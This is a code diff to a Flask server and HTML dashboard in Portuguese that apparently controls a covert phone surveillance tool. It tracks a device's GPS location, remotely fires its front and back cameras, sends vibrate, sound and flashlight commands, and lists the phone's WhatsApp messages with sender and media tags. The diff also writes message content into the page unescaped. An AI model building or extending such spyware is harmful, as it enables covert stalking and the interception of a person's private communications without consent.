@@ -34,9 +34,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
         .info-box strong { font-size: 18px; color: #f1f5f9; }
         .map-container { width: 100%; height: 300px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; }
-        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; }
-        .btn-maps { flex: 1; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 11px; }
-        .btn-cmd { background: #f59e0b; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 11px; cursor: pointer; flex: 1; }
+        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
+        .btn-maps { flex: 1; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 11px; min-width: 70px; }
+        .btn-cmd { background: #f59e0b; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 11px; cursor: pointer; flex: 1; min-width: 70px; }
         .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
         .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
         .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
@@ -46,11 +46,13 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
         .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
         .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
-        .whatsapp-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 15px; max-height: 200px; overflow-y: auto; }
+        .whatsapp-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 15px; max-height: 300px; overflow-y: auto; }
         .whatsapp-box h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
         .whatsapp-msg { background: #111; padding: 8px; border-radius: 6px; margin-bottom: 6px; border-left: 3px solid #25d366; }
-        .whatsapp-msg .titulo { color: #f1f5f9; font-weight: bold; font-size: 12px; }
+        .whatsapp-msg.midia { border-left-color: #f59e0b; }
+        .whatsapp-msg .pessoa { color: #25d366; font-weight: bold; font-size: 11px; }
         .whatsapp-msg .texto { color: #94a3b8; font-size: 11px; margin-top: 2px; }
+        .whatsapp-msg .midia-tag { color: #f59e0b; font-size: 10px; font-weight: bold; }
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
         .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
@@ -83,9 +85,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 <div id="map_private" class="map-container"></div>
                 <div class="btn-row">
                     <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">🗺️ Maps</a>
-                    <button class="btn-cmd" onclick="enviarComando('vibrar')">📳 Vibrar</button>
-                    <button class="btn-cmd" onclick="enviarComando('som')">🔊 Som</button>
-                    <button class="btn-cmd" onclick="enviarComando('lanterna')">💡 Lanterna</button>
+                    <button class="btn-cmd" onclick="enviarComando('vibrar')">📳</button>
+                    <button class="btn-cmd" onclick="enviarComando('som')">🔊</button>
+                    <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
                 </div>
                 <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Captura Sincronizada</button>
                 <div id="whatsappBox" class="whatsapp-box">
@@ -109,8 +111,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                         method: 'POST',
                         body: JSON.stringify({acao: acao}),
                         headers: {'Content-Type': 'application/json'}
-                    }).then(r => {
-                        alert(r.ok ? '✅ Comando enviado: ' + acao : '❌ Falha');
                     });
                 }
                 
@@ -119,7 +119,11 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     btn.innerText = "⏳ Sincronizando...";
                     btn.disabled = true;
                     try {
-                        await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take_dual'}), headers: {'Content-Type': 'application/json'} });
+                        await fetch('/api/comando_camera/{{ id_buscado }}', { 
+                            method: 'POST', 
+                            body: JSON.stringify({acao: 'take_dual'}), 
+                            headers: {'Content-Type': 'application/json'} 
+                        });
                         let t = 0;
                         let c = setInterval(async () => {
                             try {
@@ -150,16 +154,17 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                 marker.setLatLng([lat, lon]);
                                 map.panTo([lat, lon]);
                                 document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                                // Histórico
                                 pontos.push([lat, lon]);
                                 if(pontos.length > 50) pontos.shift();
                                 historico.setLatLngs(pontos);
                             }
-                            // WhatsApp
+                            // WhatsApp - MOSTRA TODAS
                             if(d.whatsapp && d.whatsapp.length > 0) {
                                 let html = '';
                                 d.whatsapp.forEach(m => {
-                                    html += `<div class="whatsapp-msg"><div class="titulo">${m.titulo || 'WhatsApp'}</div><div class="texto">${m.texto || ''}</div></div>`;
+                                    let cls = m.midia ? 'whatsapp-msg midia' : 'whatsapp-msg';
+                                    let midiaTag = m.midia ? '<span class="midia-tag">📎 MÍDIA</span> ' : '';
+                                    html += `<div class="${cls}"><div class="pessoa">👤 ${m.pessoa}</div><div class="texto">${midiaTag}${m.texto}</div></div>`;
                                 });
                                 document.getElementById('whatsappMsgs').innerHTML = html;
                             }
@@ -224,9 +229,11 @@ def update():
 def comando_camera(device_id):
     device_id = device_id.upper()
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id]["cmd_cam"] = request.get_json(force=True, silent=True) or {}.get("acao", "wait") or "take_dual"
+    data = request.get_json(force=True, silent=True) or {}
+    db_dispositivos[device_id]["cmd_cam"] = data.get("acao", "take_dual")
     db_dispositivos[device_id]["photo_front"] = ""
     db_dispositivos[device_id]["photo_back"] = ""
+    logger.info(f"Comando camera para {device_id}: {data.get('acao')}")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/comando_remoto/<device_id>', methods=['POST'])
@@ -236,7 +243,7 @@ def comando_remoto(device_id):
     acao = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
     db_dispositivos[device_id]["cmd_remoto"] = acao
     logger.info(f"Comando remoto {acao} para {device_id}")
-    return jsonify({"status": "ok", "comando": acao}), 200
+    return jsonify({"status": "ok"}), 200
 
 @app.route('/api/upload_lote', methods=['POST'])
 def upload_lote():
@@ -245,6 +252,7 @@ def upload_lote():
     if dev_id and dev_id in db_dispositivos:
         if data.get("photo_front"): db_dispositivos[dev_id]["photo_front"] = data["photo_front"]
         if data.get("photo_back"): db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
+        logger.info(f"LOTE recebido de {dev_id}")
         return jsonify({"status": "stored"}), 200
     return jsonify({"status": "error"}), 404
 
